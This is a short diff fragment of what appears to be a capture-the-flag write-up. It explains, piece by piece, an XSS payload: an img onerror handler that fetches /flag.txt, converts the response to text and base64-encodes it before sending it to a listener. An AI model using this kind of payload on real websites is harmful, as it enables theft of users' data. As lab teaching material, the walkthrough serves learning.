@@ -114,12 +114,13 @@ fetch('/flag.txt')
 })
 </script>"
 
-"<img src=x onerror=" ... ">" We call a imagen that not exists
+"&ltimg src=x onerror=" ... ">" We call a imagen that not exists
+
 "fetch('/flag.txt')"    We call the flag.txt
+
 ".then(r=>r.text())"    Fetch() returns a promise, r is the request, .text convert the string in plaintext
+
 btoa(data)              Encode the data in base64, why? for not brek the output
-
-
 
 
 We start the listener, and submit the script 
